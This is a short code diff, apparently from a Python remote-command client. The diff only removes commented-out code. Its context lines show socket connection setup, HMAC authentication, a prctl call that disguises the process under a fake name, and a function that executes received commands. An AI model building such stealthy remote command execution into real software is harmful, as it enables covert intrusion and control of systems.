@@ -34,13 +34,8 @@ def create_connection(host, port):
     
     return secure_sock
 
-
-# def compute_hmac(secret, message):
-#     return hmac.new(secret, message, hashlib.sha256).digest()
-
 def compute_hmac(secret, message):
     return hmac.new(secret.encode('utf-8'), message, hashlib.sha256).digest()
-
 
 def authenticate(sock, secret):
     try:
@@ -68,14 +63,6 @@ def process_name():
         libc.prctl(15, fake_name, 0, 0, 0)
     except Exception:
         pass
-
-
-# def execute_command(command):
-#     try:
-#         result = commands.getoutput(command)
-#         return result
-#     except Exception as e:
-#         return "ERROR: " + str(e)
 
 def execute_command(command):
     global current_dir
